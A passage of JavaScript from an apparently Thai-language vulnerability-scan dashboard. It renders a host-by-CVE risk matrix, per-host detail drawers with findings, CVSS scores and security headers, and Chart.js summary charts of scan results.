      if(f.bucket === 'warning'){
        return `<td class="mxc mx-w" title="${esc(h.host)}: ${esc(c.cve)} - อาจเสี่ยง (Warning)" onclick="openDr('${esc(h.host).replace(/'/g,"\'")}');event.stopPropagation()">!</td>`;
      }
      if(f.bucket === 'unknown'){
        return `<td class="mxc mx-u" title="${esc(h.host)}: ${esc(c.cve)} - ยังไม่ทราบ" onclick="openDr('${esc(h.host).replace(/'/g,"\'")}');event.stopPropagation()">?</td>`;
      }
      if(f.bucket === 'safe'){
        return `<td class="mxc mx-s" title="${esc(h.host)}: ${esc(c.cve)} - ปลอดภัย" onclick="openDr('${esc(h.host).replace(/'/g,"\'")}');event.stopPropagation()">✓</td>`;
      }
      return `<td class="mxc mx-na">—</td>`;
    }).join('');

    const ipCell = h.ip ? `<code style="font-size:10px;background:#f0f3fb;padding:1px 4px;border-radius:3px;color:#1d4ed8">${esc(h.ip)}</code>` : '<span style="color:#ccc">—</span>';

    return `<tr onclick="openDr('${esc(h.host).replace(/'/g,"\'")}')" style="cursor:pointer">
      <td style="text-align:center;font-weight:700;color:var(--muted);font-size:11px;width:40px">${i+1}</td>
      <td class="mxh"><b>${esc(h.host)}</b></td>
      <td>${ipCell}</td>
      ${cells}
    </tr>`;
  }).join('');

  const mxCnt = document.getElementById('mx-cnt');
  if(mxCnt){
    mxCnt.innerHTML = `แสดง <b>${hosts.length}</b> โฮสต์ × <b>${activeCVEs.length}</b> คอลัมน์ CVE ในเมทริกซ์ (ลำดับ 1-${hosts.length})`;
  }

  // 3. Matrix Legend Table
  const legTb = document.getElementById('mxleg-tb');
  if(legTb){
    legTb.innerHTML = activeCVEs.map((c, i) => {
      const matchCount = data.filteredFindings.filter(f => f.cve === c.cve && (F.bucket !== 'all' ? true : (f.bucket === 'vulnerable' || f.bucket === 'warning'))).length;
      return `<tr onclick="filterByCVE('${c.cve}')" style="cursor:pointer" title="คลิกเพื่อกรองเฉพาะ CVE นี้">
        <td style="text-align:center;font-weight:700;color:var(--muted);font-size:11px;width:42px">${i+1}</td>
        <td><span class="tag" style="background:var(--ink);color:#fff">${esc(c.code)}</span></td>
        <td><b>${esc(c.cve)}</b></td>
        <td><span class="tag" style="background:#eef2fb;color:var(--ink);border:1px solid #c5d2f6">${esc(c.cat)}</span></td>
        <td><span class="tag" style="background:${SC[c.sev]||'#868e96'};color:#fff">${esc(c.sev)}</span></td>
        <td>${esc(c.name)}</td>
        <td style="text-align:center;font-weight:700;color:${matchCount?'var(--vuln)':'inherit'}">${matchCount} โฮสต์</td>
      </tr>`;
    }).join('');
  }
}

// ── 7. Drawer (Host Details) ──
function openDr(hostname, forceAll){
  const data = cachedFilteredData || getFilteredData();
  const vh = data.filteredHosts.find(x => x.host === hostname);
  const rawH = D.hosts.find(x => x.host === hostname);
  if(!rawH) return;

  const h = vh || rawH;
  const isFilteredView = data.isFiltered && !forceAll && vh;
  const finds = isFilteredView ? vh.findings : (rawH.findings || []);
  const lvlCol = LC[h.level] || '#6b7280';

  // Header
  document.getElementById('dr-host').textContent = h.host;
  document.getElementById('dr-head').style.background = lvlCol;
  document.getElementById('dr-meta').innerHTML = [
    h.ip ? `<span>🌐 <code style="font-size:11px;background:rgba(255,255,255,.15);padding:1px 5px;border-radius:3px">${esc(h.ip)}</code></span>` : '',
    h.server ? `<span>🖥 ${esc(h.server)}</span>` : '',
    h.php ? `<span>🐘 PHP ${esc(h.php)}</span>` : '',
    h.cms ? `<span>📦 ${esc(h.cms)}</span>` : '',
    `<span class="pill" style="background:rgba(255,255,255,.25);font-size:11px">${LT[h.level]||h.level}</span>`,
    `<span>ดัชนีเสี่ยง: <b>${h.score}</b></span>`,
    `<span>CVSS สูงสุด: <b>${fmtHostCvss(h)}</b></span>`,
  ].filter(Boolean).join('');

  let html = '';

  // Info Grid
  html += `<div class="dr-info">
    <div class="dr-info-cell"><div class="lab">IP Address</div>
      <div class="val" style="font-family:monospace;color:#1d4ed8">${esc(h.ip)||'<span style="color:#9aa0ab;font-weight:400">ยังไม่ระบุ</span>'}</div></div>
    <div class="dr-info-cell"><div class="lab">OS / ระบบปฏิบัติการ</div><div class="val">${esc(h.os)||'ไม่ทราบ'}</div></div>
    <div class="dr-info-cell"><div class="lab">เซิร์ฟเวอร์</div><div class="val">${esc(h.server)||'ไม่ทราบ'}</div></div>
    <div class="dr-info-cell"><div class="lab">PHP Version</div><div class="val">${esc(h.php)||'—'}</div></div>
    <div class="dr-info-cell"><div class="lab">CMS / App</div><div class="val">${esc(h.cms)||'—'}</div></div>
    <div class="dr-info-cell"><div class="lab">WAF / Proxy</div><div class="val">${esc(h.waf)||'—'}</div></div>
    ${h.device ? `<div class="dr-info-cell"><div class="lab">อุปกรณ์/แพลตฟอร์ม</div><div class="val">${esc(h.device)}</div></div>` : ''}
    ${h.mac ? `<div class="dr-info-cell"><div class="lab">MAC / ผู้ผลิต</div><div class="val" style="font-family:monospace">${esc(h.mac)}${h.mac_vendor?(' · '+esc(h.mac_vendor)):''}</div></div>` : ''}
  </div>`;

  // Stack profile + ส่วนประกอบอื่น (ชั้นที่ตรวจพบ)
  if((h.stack && h.stack.length) || (h.components && h.components.length)){
    html += `<div class="dr-sec" style="padding-top:10px">`;
    if(h.stack && h.stack.length){
      html += `<h4>โปรไฟล์สแตก (Stack Fingerprint)</h4>
        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:8px">` +
        h.stack.map(s => `<span class="tag" style="background:#eef2fb;color:var(--ink);border:1px solid #c5d2f6">${esc(s)}</span>`).join('<span style="color:#9aa0ab">→</span>') +
        `</div>`;
    }
    if(h.components && h.components.length){
      html += `<div style="font-size:12px;color:var(--muted)">🧩 ส่วนประกอบอื่น (DB/JS/tool): ` +
        h.components.map(c => `<b style="color:var(--ink)">${esc(c.name)}${c.version?(' '+esc(c.version)):''}</b>`).join(', ') +
        `</div>`;
    }
    html += `</div>`;
  }

  // ตารางสรุปเทคโนโลยี + EOL/CVE (รวมทุกชั้น)
  if(h.tech && h.tech.length){
    const sevCol2 = {Critical:'#c0392b',High:'#d35400','Medium-High':'#d35400',Medium:'#e67e22',Low:'#2980b9',Info:'#6b7280'};
    html += `<div class="dr-sec"><h4>สรุปเทคโนโลยี + EOL / CVE</h4>
      <table style="width:100%;border-collapse:collapse;font-size:12px">
      <thead><tr style="background:#f0f3fb;color:var(--ink)">
        <th style="text-align:left;padding:6px 8px">เทคโนโลยี</th>
        <th style="text-align:left;padding:6px 8px">เวอร์ชัน</th>
        <th style="text-align:left;padding:6px 8px">สถานะ</th>
        <th style="text-align:center;padding:6px 8px">CVE</th>
        <th style="text-align:left;padding:6px 8px">รุนแรงสุด</th>
      </tr></thead><tbody>` +
      h.tech.map(t => `<tr style="border-bottom:1px solid #eef0f5">
        <td style="padding:6px 8px;font-weight:600">${esc(t[0])}</td>
        <td style="padding:6px 8px;font-family:monospace">${esc(t[1])}</td>
        <td style="padding:6px 8px">${esc(t[2])}</td>
        <td style="padding:6px 8px;text-align:center;font-weight:700;color:${t[3]!=='—'?'var(--vuln)':'var(--muted)'}">${esc(t[3])}</td>
        <td style="padding:6px 8px;font-weight:600;color:${sevCol2[t[4]]||'var(--muted)'}">${esc(t[4])}</td>
      </tr>`).join('') +
      `</tbody></table></div>`;
  }

  // Filter Notification Banner inside Drawer
  if(data.isFiltered && rawH.findings && rawH.findings.length !== finds.length){
    html += `<div style="background:#eef2fb;border-bottom:1px solid #c5d2f6;padding:10px 16px;display:flex;justify-content:space-between;align-items:center;font-size:12px">
      <span style="color:var(--ink);font-weight:700">🔍 กำลังแสดงเฉพาะ ${finds.length} รายการที่ตรงกับตัวกรอง</span>
      <button onclick="openDr('${esc(h.host).replace(/'/g,"\'")}', ${!forceAll})" style="background:#fff;border:1.5px solid var(--ink);color:var(--ink);padding:4px 10px;border-radius:5px;font-size:11px;font-weight:700;cursor:pointer">
        ${forceAll ? 'แสดงเฉพาะที่กรอง' : 'ดูทั้งหมด (' + rawH.findings.length + ' รายการ)'}
      </button>
    </div>`;
  }

  // Summary badges
  const vCnt = finds.filter(f => f.bucket==='vulnerable').length;
  const wCnt = finds.filter(f => f.bucket==='warning').length;
  const uCnt = finds.filter(f => f.bucket==='unknown').length;
  const sCnt = finds.filter(f => f.bucket==='safe').length;
  const detCnt = vCnt + wCnt;

  html += `<div class="dr-sec" style="padding-bottom:4px">
    <h4>สรุปผลการตรวจ (ตรวจพบจริง ${detCnt} รายการ · จากที่ใช้สแกน ${finds.length} รายการ)</h4>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:4px">
      <span class="pill" style="background:${vCnt?'var(--vuln)':'#9aa0ab'}">🔴 ยืนยันเสี่ยง: ${vCnt}</span>
      <span class="pill" style="background:${wCnt?'var(--warn)':'#9aa0ab'}">🟠 อาจเสี่ยง: ${wCnt}</span>
      ${uCnt ? `<span class="pill" style="background:var(--unk)">⚫ ไม่ทราบ: ${uCnt}</span>` : ''}
      <span class="pill" style="background:var(--safe)">🟢 ปลอดภัย/ไม่เกี่ยวข้อง: ${sCnt}</span>
      ${h.lfi ? `<span class="tag" style="background:#7b2d8b;color:#fff">⚠ LFI พบไฟล์ ${h.lfi}</span>` : ''}
    </div>
  </div>`;

  const sevOrd = ['Critical', 'High', 'Medium', 'Low', 'Info'];
  const sevCol = { Critical: '#c0392b', High: '#d35400', Medium: '#e67e22', Low: '#2980b9', Info: '#6b7280' };

  function renderFindingItems(itemList, prefixTag){
    const sevGroup = {};
    itemList.forEach(f => {
      const sv = f.sev || 'Info';
      (sevGroup[sv] = sevGroup[sv] || []).push(f);
    });
    let outHtml = '';
    sevOrd.forEach(sev => {
      const grp = (sevGroup[sev] || []).sort((a,b) => BKTORD[a.bucket] - BKTORD[b.bucket]);
      if(!grp.length) return;
      outHtml += `<div class="sev-sep" style="background:${sevCol[sev]}">${sev} (${grp.length})</div>`;
      grp.forEach((f, idx) => {
        const bktCol = f.bucket==='vulnerable' ? 'var(--vuln)' : f.bucket==='warning' ? 'var(--warn)' : f.bucket==='unknown' ? 'var(--unk)' : 'var(--safe)';
        const uid = `fi_${prefixTag}_${hostname.replace(/[^a-zA-Z0-9]/g,'_')}_${sev}_${idx}`;
        const fCvssBadge = (f.bucket === 'safe')
          ? '0.0'
          : (f.bucket === 'unknown' ? 'รอตรวจ' : (f.cvss != null ? f.cvss.toFixed(1) : 'N/A'));
        const fCvssCol = (f.bucket === 'safe')
          ? '#1e7e34'
          : (f.bucket === 'unknown' ? '#6b7280' : cvssColor(f.cvss));
        const refCvssNote = (f.base_cvss != null && f.bucket === 'safe')
          ? ` <span style="color:var(--muted);font-weight:400;font-size:11px">(ปลอดภัย — ค่า CVSS อ้างอิงของ CVE คือ ${f.base_cvss.toFixed(1)})</span>`
          : (f.base_cvss != null && f.bucket === 'unknown'
             ? ` <span style="color:var(--muted);font-weight:400;font-size:11px">(รอตรวจยืนยัน — ค่า CVSS อ้างอิงของ CVE คือ ${f.base_cvss.toFixed(1)})</span>`
             : '');
        outHtml += `<div class="fitem bk-${f.bucket}">
          <div class="fitem-head" id="h_${uid}" onclick="tog('${uid}')">
            <span style="color:var(--muted);font-weight:700;font-size:11px;min-width:24px">${idx+1}.</span>
            <span class="fitem-cve">${esc(f.cve)}</span>
            <span class="fitem-name">${esc(f.name)}</span>
            <span class="fitem-cvss" style="background:${fCvssCol}">${fCvssBadge}</span>
            <span class="pill" style="background:${bktCol};margin-left:4px;font-size:10px">${esc(f.label)}</span>
            <span style="color:#9aa0ab;font-size:18px;line-height:1;flex:none" id="arr_${uid}">›</span>
          </div>
          <div class="fitem-detail" id="d_${uid}">
            <table style="width:100%">
              <tr><td>ประเภท</td><td>${esc(f.cat)||'—'}</td></tr>
              <tr><td>ความรุนแรง</td><td><span class="tag" style="background:${sevCol[sev]||'#868e96'};color:#fff">${esc(f.sev)}</span></td></tr>
              <tr><td>CVSS Score</td><td><b style="color:${fCvssCol}">${fCvssBadge}</b>${refCvssNote}</td></tr>
              <tr><td>สถานะ</td><td><span class="pill" style="background:${bktCol}">${esc(f.label)}</span></td></tr>
              ${f.explain ? `<tr><td>ความหมาย</td><td>${esc(f.explain)}</td></tr>` : ''}
              <tr><td>รายละเอียด</td><td>${esc(f.reason)||'—'}</td></tr>
              ${f.trigger ? `<tr><td>Trigger</td><td><code style="font-size:11px;background:#f0f1f5;padding:2px 5px;border-radius:3px">${esc(f.trigger)}</code></td></tr>` : ''}
              ${f.hcheck ? `<tr><td>ตรวจสอบด้วย</td><td><code style="font-size:11px;background:#f0f1f5;padding:2px 5px;border-radius:3px;word-break:break-all">${esc(f.hcheck)}</code></td></tr>` : ''}
              ${f.confirm ? `<tr><td>ผลที่ยืนยัน</td><td>
                <div style="border-left:3px solid #e03131;background:#fff5f5;padding:6px 9px;border-radius:0 4px 4px 0;margin-bottom:5px">
                  <b style="color:#c92a2a;font-size:11px">🔴 ถือว่ากระทบ เมื่อ:</b>
                  <div style="font-size:12px;color:#495057;margin-top:2px">${esc(f.confirm.vuln)}</div></div>
                <div style="border-left:3px solid #2f9e44;background:#f4fcf6;padding:6px 9px;border-radius:0 4px 4px 0">
                  <b style="color:#2b8a3e;font-size:11px">🟢 ถือว่าปลอดภัย เมื่อ:</b>
                  <div style="font-size:12px;color:#495057;margin-top:2px">${esc(f.confirm.safe)}</div></div>
              </td></tr>` : ''}
            </table>
          </div>
        </div>`;
      });
    });
    return outHtml;
  }

  const activeFinds = (F.bucket === 'safe')
    ? finds
    : finds.filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning' || f.bucket === 'unknown');
  const safeOrNaFinds = (F.bucket === 'safe')
    ? []
    : finds.filter(f => f.bucket === 'safe');

  html += `<div class="dr-sec"><h4>ช่องโหว่ที่ตรวจพบ (${detCnt} รายการ${uCnt ? ' · รอตรวจบนเครื่อง ' + uCnt + ' รายการ' : ''})</h4>`;
  if(!activeFinds.length){
    html += `<div style="background:#f2fbf5;border:1px solid #bbf7d0;color:#166534;border-radius:8px;padding:12px 14px;font-size:13px;font-weight:600;margin-bottom:10px">
      ✅ ไม่พบช่องโหว่หรือสัญญาณความเสี่ยงบนโฮสต์นี้ (ผ่านการตรวจสอบทั้งหมด ${finds.length} รายการ)
    </div>`;
  } else {
    html += renderFindingItems(activeFinds, 'act');
  }
  if(safeOrNaFinds.length){
    html += `<details style="margin-top:12px;border:1px solid var(--line);border-radius:8px;padding:8px 12px;background:#fbfcfe">
      <summary style="cursor:pointer;font-size:12.5px;font-weight:700;color:var(--muted);user-select:none">
        🟢 ดูรายการที่ปลอดภัย / ไม่เกี่ยวข้องกับเทคโนโลยีบนเครื่อง (${safeOrNaFinds.length} รายการ จากที่สแกน ${finds.length} รายการ)
      </summary>
      <div style="margin-top:8px">${renderFindingItems(safeOrNaFinds, 'safe')}</div>
    </details>`;
  }
  html += '</div>';

  // HTTP Headers
  const hdr = rawH.hdr || {};
  const hdrKeys = Object.keys(hdr).filter(k => hdr[k]);
  if(hdrKeys.length){
    html += `<div class="dr-sec"><h4>HTTP Security Headers</h4>
      <table style="width:100%;font-size:12px">`;
    const goodH = ['strict-transport-security','content-security-policy','x-frame-options',
                   'x-content-type-options','referrer-policy','permissions-policy'];
    hdrKeys.forEach(k => {
      const present = !!hdr[k];
      const isGood = goodH.includes(k.toLowerCase());
      const ico = present ? (isGood ? '✅' : 'ℹ️') : '❌';
      html += `<tr><td style="color:var(--muted);white-space:nowrap;padding:3px 0;vertical-align:top;padding-right:10px">${ico} ${esc(k)}</td>
             <td style="font-family:monospace;font-size:11px;word-break:break-all;padding:3px 0">${esc(hdr[k]||'—')}</td></tr>`;
    });
    html += '</table></div>';
  }

  document.getElementById('dr-body').innerHTML = html;
  document.getElementById('overlay').classList.add('open');
  document.getElementById('drawer').classList.add('open');
  document.body.style.overflow = 'hidden';
}

function closeDr(){
  document.getElementById('overlay').classList.remove('open');
  document.getElementById('drawer').classList.remove('open');
  document.body.style.overflow = '';
}

function tog(uid){
  const det = document.getElementById('d_' + uid);
  const hd = document.getElementById('h_' + uid);
  const arr = document.getElementById('arr_' + uid);
  const open = det.classList.toggle('open');
  hd.classList.toggle('open', open);
  if(arr) arr.style.transform = open ? 'rotate(90deg)' : '';
}

document.addEventListener('keydown', e => { if(e.key === 'Escape') closeDr(); });

// Methodology toggle
document.getElementById('meth-toggle').addEventListener('click', function(){
  var b = document.getElementById('meth-body');
  var a = document.getElementById('meth-arr');
  var open = b.style.display === 'none';
  b.style.display = open ? 'block' : 'none';
  a.style.transform = open ? 'rotate(90deg)' : '';
});

// ── 8. Chart.js Interactive Engine ──
window.CHARTS = {};

function initCharts(){
  if(typeof Chart === 'undefined') return;
  const FONT = { family: "'Noto Sans Thai','Sarabun',sans-serif", size: 11 };
  Chart.defaults.font = FONT;
  Chart.defaults.color = (getComputedStyle(document.documentElement).getPropertyValue('--ink') || '#2c3e50').trim();

  function hoverPtr(evt, elements){
    evt.native.target.style.cursor = (elements && elements.length) ? 'pointer' : 'default';
  }

  // 1. ch-donut-risk (ระดับความเสี่ยง โฮสต์)
  const elRisk = document.getElementById('ch-donut-risk');
  if(elRisk){
    window.CHARTS.donutRisk = new Chart(elRisk, {
      type: 'doughnut',
      data: {
        labels: ['ยืนยันเสี่ยง', 'อาจเสี่ยง', 'ไม่ทราบ', 'ปลอดภัย', 'เข้าไม่ถึง'],
        datasets: [{ data: [0,0,0,0,0], backgroundColor: ['#c0392b','#d35400','#6b7280','#1e7e34','#94a3b8'], borderWidth: 2, borderColor: '#fff', hoverOffset: 8 }]
      },
      options: {
        responsive: true, maintainAspectRatio: false, cutout: '58%',
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            const lvls = ['critical','warning','unknown','safe','n/a'];
            if(lvls[idx] === 'n/a') filterByUnreachable();
            else filterByLevel(lvls[idx]);
          }
        },
        plugins: {
          legend: { position: 'right', labels: { boxWidth: 12, padding: 8, font: FONT } },
          tooltip: { callbacks: { label: function(c){ return c.label + ': ' + (c.raw!==undefined?c.raw:c.parsed) + ' โฮสต์ (คลิกเพื่อกรอง)'; } } }
        }
      }
    });
  }

  // 2. ch-donut-ip (Top IP เสี่ยง)
  const elIP = document.getElementById('ch-donut-ip');
  if(elIP){
    window.CHARTS.donutIP = new Chart(elIP, {
      type: 'doughnut',
      data: { labels: [], datasets: [{ data: [], backgroundColor: [], borderWidth: 2, borderColor: '#fff', hoverOffset: 8 }] },
      options: {
        responsive: true, maintainAspectRatio: false, cutout: '58%',
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            if(window._topIPs && window._topIPs[idx]) filterByIP(window._topIPs[idx]);
            else scrollToTable('iptbl');
          }
        },
        plugins: {
          legend: { position: 'right', labels: { boxWidth: 12, padding: 6, font: { size: 10 } } },
          tooltip: { callbacks: { label: function(c){ return c.label + ': ' + (c.raw!==undefined?c.raw:c.parsed) + ' รายการเสี่ยง (คลิกเพื่อดูโฮสต์)'; } } }
        }
      }
    });
  }

  // 3. ch-donut-sev (ความรุนแรง)
  const elSev = document.getElementById('ch-donut-sev');
  if(elSev){
    window.CHARTS.donutSev = new Chart(elSev, {
      type: 'doughnut',
      data: { labels: [], datasets: [{ data: [], backgroundColor: [], borderWidth: 2, borderColor: '#fff', hoverOffset: 8 }] },
      options: {
        responsive: true, maintainAspectRatio: false, cutout: '58%',
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            if(window._sevLabels && window._sevLabels[idx]) filterBySeverity(window._sevLabels[idx]);
          }
        },
        plugins: {
          legend: { position: 'right', labels: { boxWidth: 12, padding: 8, font: FONT } },
          tooltip: { callbacks: { label: function(c){ return c.label + ': ' + (c.raw!==undefined?c.raw:c.parsed) + ' รายการ (คลิกเพื่อกรอง)'; } } }
        }
      }
    });
  }

  // 4. ch-bar-cat (Category)
  const elCat = document.getElementById('ch-bar-cat');
  if(elCat){
    window.CHARTS.barCat = new Chart(elCat, {
      type: 'bar',
      data: { labels: [], datasets: [{ data: [], backgroundColor: [], borderRadius: 4, borderSkipped: false }] },
      options: {
        responsive: true, maintainAspectRatio: false,
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            if(window._catLabels && window._catLabels[idx]) filterByCategory(window._catLabels[idx]);
          }
        },
        plugins: {
          legend: { display: false },
          tooltip: { callbacks: { label: function(c){ return c.label + ': ' + (c.raw!==undefined?c.raw:(c.parsed&&c.parsed.y!==undefined?c.parsed.y:c.parsed)) + ' รายการ (คลิกเพื่อกรอง)'; } } }
        },
        scales: {
          x: { grid: { display: false }, ticks: { maxRotation: 40, font: { size: 10 } } },
          y: { beginAtZero: true, grid: { color: 'rgba(0,0,0,.07)' }, ticks: { precision: 0 } }
        }
      }
    });
  }

  // 5. ch-donut-tech (เว็บเซิร์ฟเวอร์)
  const elTech = document.getElementById('ch-donut-tech');
  if(elTech){
    window.CHARTS.donutTech = new Chart(elTech, {
      type: 'doughnut',
      data: { labels: [], datasets: [{ data: [], backgroundColor: [], borderWidth: 2, borderColor: '#fff', hoverOffset: 8 }] },
      options: {
        responsive: true, maintainAspectRatio: false, cutout: '58%',
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            if(window._srvLabels && window._srvLabels[idx]) filterByServer(window._srvLabels[idx]);
          }
        },
        plugins: {
          legend: { position: 'right', labels: { boxWidth: 12, padding: 6, font: { size: 10 } } },
          tooltip: { callbacks: { label: function(c){ return c.label + ': ' + (c.raw!==undefined?c.raw:c.parsed) + ' โฮสต์ (คลิกเพื่อกรอง)'; } } }
        }
      }
    });
  }

  // 6. ch-bar-status (สถานะการตรวจพบ)
  const elStatus = document.getElementById('ch-bar-status');
  if(elStatus){
    window.CHARTS.barStatus = new Chart(elStatus, {
      type: 'bar',
      data: {
        labels: ['ยืนยัน', 'อาจเสี่ยง', 'ไม่ทราบ', 'ปลอดภัย'],
        datasets: [{ data: [0,0,0,0], backgroundColor: ['#c0392b','#d35400','#6b7280','#1e7e34'], borderRadius: 4, borderSkipped: false }]
      },
      options: {
        responsive: true, maintainAspectRatio: false,
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            const bkts = ['vulnerable', 'warning', 'unknown', 'safe'];
            filterByBucket(bkts[idx]);
          }
        },
        plugins: {
          legend: { display: false },
          tooltip: { callbacks: { label: function(c){ return c.label + ': ' + (c.raw!==undefined?c.raw:(c.parsed&&c.parsed.y!==undefined?c.parsed.y:c.parsed)) + ' รายการ (คลิกเพื่อแสดงเฉพาะสถานะนี้)'; } } }
        },
        scales: {
          x: { grid: { display: false } },
          y: { beginAtZero: true, grid: { color: 'rgba(0,0,0,.07)' }, ticks: { precision: 0 } }
        }
      }
    });
  }

  // 7. ch-bar-hosts (Top 15 โฮสต์)
  const elHosts = document.getElementById('ch-bar-hosts');
  if(elHosts){
    window.CHARTS.barHosts = new Chart(elHosts, {
      type: 'bar',
      data: { labels: [], datasets: [{ data: [], backgroundColor: [], borderRadius: 4, borderSkipped: false, minBarLength: 6 }] },
      options: {
        indexAxis: 'y', responsive: true, maintainAspectRatio: false,
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            if(window._topHosts && window._topHosts[idx]) openDr(window._topHosts[idx]);
          }
        },
        plugins: {
          legend: { display: false },
          tooltip: { callbacks: { label: function(c){ return 'ดัชนีเสี่ยง: ' + (c.raw!==undefined?c.raw:(c.parsed&&c.parsed.x!==undefined?c.parsed.x:c.parsed)) + ' (คลิกเพื่อดูรายละเอียดโฮสต์)'; } } }
        },
        scales: {
          x: { beginAtZero: true, grid: { color: 'rgba(0,0,0,.07)' }, ticks: { precision: 0 }, title: { display: true, text: 'ดัชนีความเสี่ยง (0-100)', font: { size: 11 } } },
          y: { grid: { display: false }, ticks: { font: { size: 10 } } }
        }
      }
    });
  }

  // 8. ch-hist-cvss (CVSS v3.1 distribution histogram: 0.0 None/ปลอดภัย .. 9.0–10.0 Critical)
  const elCVSS = document.getElementById('ch-hist-cvss');
  if(elCVSS){
    window.CHARTS.histCvss = new Chart(elCVSS, {
      type: 'bar',
      data: {
        labels: ['0.0 (ปลอดภัย)', '1', '2', '3', '4', '5', '6', '7', '8', '9–10'],
        datasets: [{
          data: [0,0,0,0,0,0,0,0,0,0],
          backgroundColor: ['#1e7e34','#2980b9','#2980b9','#2980b9','#f39c12','#f39c12','#e67e22','#d35400','#c0392b','#c0392b'],
          borderRadius: 3, borderSkipped: false,
          minBarLength: 8
        }]
      },
      options: {
        responsive: true, maintainAspectRatio: false,
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            filterByCvssBin(idx);
          }
        },
        plugins: {
          legend: { display: false },
          tooltip: {
            callbacks: {
              label: function(c){
                const val = (c.raw!==undefined?c.raw:(c.parsed&&c.parsed.y!==undefined?c.parsed.y:c.parsed));
                if(c.dataIndex === 0){
                  return 'CVSS 0.0 (None / ปลอดภัย): ' + val + ' รายการ (คลิกเพื่อกรอง)';
                }
                const rng = (c.dataIndex === 9) ? '9.0–10.0 (Critical)' : (c.dataIndex + '.0–' + c.dataIndex + '.9');
                return 'CVSS ' + rng + ': ' + val + ' รายการ (คลิกเพื่อกรอง)';
              }
            }
          }
        },
        scales: {
          x: {
            grid: { display: false },
            title: { display: true, text: 'CVSS v3.1 Score (0.0 = ปลอดภัย, 0.1–3.9 = ต่ำ, 4.0–6.9 = กลาง, 7.0–8.9 = สูง, 9.0–10.0 = วิกฤต)', font: { size: 10.5 } }
          },
          y: { beginAtZero: true, grid: { color: 'rgba(0,0,0,.07)' }, ticks: { precision: 0 } }
        }
      }
    });
  }

  // 9. ch-stacked (โฮสต์: ยืนยัน vs พบสัญญาณ)
  const elStacked = document.getElementById('ch-stacked');
  if(elStacked){
    window.CHARTS.stacked = new Chart(elStacked, {
      type: 'bar',
      data: {
        labels: [],
        datasets: [
          { label: 'ยืนยัน', data: [], backgroundColor: '#c0392b', borderRadius: 2, borderSkipped: false },
          { label: 'อาจเสี่ยง', data: [], backgroundColor: '#d35400', borderRadius: 2, borderSkipped: false }
        ]
      },
      options: {
        responsive: true, maintainAspectRatio: false,
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            if(window._topStacked && window._topStacked[idx]) openDr(window._topStacked[idx]);
          }
        },
        plugins: {
          legend: { position: 'top', labels: { boxWidth: 12, padding: 8, font: FONT } },
          tooltip: { callbacks: { afterBody: function(){ return 'คลิกเพื่อดูรายละเอียดโฮสต์'; } } }
        },
        scales: {
          x: { stacked: true, grid: { display: false }, ticks: { maxRotation: 40, font: { size: 10 } } },
          y: { stacked: true, beginAtZero: true, grid: { color: 'rgba(0,0,0,.07)' }, ticks: { precision: 0 } }
        }
      }
    });
  }

  // 10. ch-bar-tc8 (ตรวจพบตาม 8 กลุ่ม ThaiCERT) — คิดจาก DATA ทั้งหมด ไม่ขึ้นกับตัวกรอง
  const elTC8 = document.getElementById('ch-bar-tc8');
  const tc8 = (D.thaicert || []);
  if(elTC8 && tc8.length){
    const tc8col = p => p>=70 ? '#2e9e5b' : (p>=45 ? '#f08c00' : '#e03131');
    window._tc8nos = tc8.map(x=>x.no);
    window.CHARTS.barTC8 = new Chart(elTC8, {
      type: 'bar',
      data: {
        labels: tc8.map(x=>x.no+'. '+x.name),
        datasets: [{
          data: tc8.map(x=>x.hosts),
          backgroundColor: tc8.map(x=>tc8col(x.cap)),
          borderRadius: 4, borderSkipped: false, minBarLength: 3
        }]
      },
      options: {
        indexAxis: 'y', responsive: true, maintainAspectRatio: false,
        onHover: hoverPtr,
        onClick: function(evt, elements){
          if(elements && elements.length){
            const idx = elements[0].index;
            const no = (window._tc8nos||[])[idx];
            if(no){
              const det = document.getElementById('tc8det_'+no);
              if(det && det.style.display==='none') togTC8(no);
              const tbl = document.getElementById('tc8-tbl');
              if(tbl) tbl.scrollIntoView({behavior:'smooth', block:'center'});
            }
          }
        },
        plugins: {
          legend: { display: false },
          tooltip: { callbacks: { label: function(c){
            const x = tc8[c.dataIndex] || {};
            return (x.hosts||0) + ' โฮสต์ · ความสามารถตรวจ ' + (x.cap||0) + '% (คลิกเพื่อดูรายละเอียดกลุ่ม)';
          } } }
        },
        scales: {
          x: { beginAtZero: true, grid: { color: 'rgba(0,0,0,.07)' }, ticks: { precision: 0 }, title: { display: true, text: 'จำนวนโฮสต์ที่ตรวจพบในกลุ่ม', font: { size: 11 } } },
          y: { grid: { display: false }, ticks: { font: { size: 10 } } }
        }
      }
    });
  }
}

function updateCharts(data){
  if(typeof Chart === 'undefined') return;
  const filteredHosts = data.filteredHosts;
  const filteredFindings = data.filteredFindings;

  // 1. ch-donut-risk
  if(window.CHARTS.donutRisk){
    let crit = 0, warn = 0, unk = 0, safe = 0, unreach = 0;
    filteredHosts.forEach(h => {
      if(!h.reachable) unreach++;
      else if(h.level === 'critical') crit++;
      else if(h.level === 'warning') warn++;
      else if(h.level === 'unknown') unk++;
      else if(h.level === 'safe') safe++;
    });
    window.CHARTS.donutRisk.data.datasets[0].data = [crit, warn, unk, safe, unreach];
    window.CHARTS.donutRisk.update();
  }

  // 2. ch-donut-ip
  if(window.CHARTS.donutIP){
    const ipMap = {};
    filteredHosts.forEach(h => {
      const ip = h.ip || 'Unknown';
      if(!ipMap[ip]) ipMap[ip] = { ip: ip, vuln: 0, score: 0, count: 0 };
      ipMap[ip].vuln += (h.vulnerable || 0);
      ipMap[ip].score += (h.score || 0);
